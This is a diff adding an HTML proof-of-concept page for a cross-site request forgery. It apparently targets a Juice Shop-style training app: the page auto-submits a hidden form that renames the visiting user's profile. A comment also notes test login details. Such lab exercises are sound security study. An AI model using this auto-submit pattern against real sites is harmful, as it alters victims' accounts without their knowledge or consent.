@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>CSRF Attack</title>
+    </head>
+    <body>
+        <h1>If you see me I did not auto submit</h1>
+        
+        <!-- Just visiting this page causes a name change automatically! -->
+        <!-- password and client@email.com, Q: Sun Tzu -->
+        <!-- This will go to website + "profile" form and post it, creating new username IhacktU-->
+        <form action="https://juicey-webapp.herokuapp.com/profile" method="POST">
+            
+            <input type="text" name="username" value="IhacktU">
+        </form>
+        
+        <script type="text/javascript">
+            //Auto-submit form telling application to change name on juiceshop
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
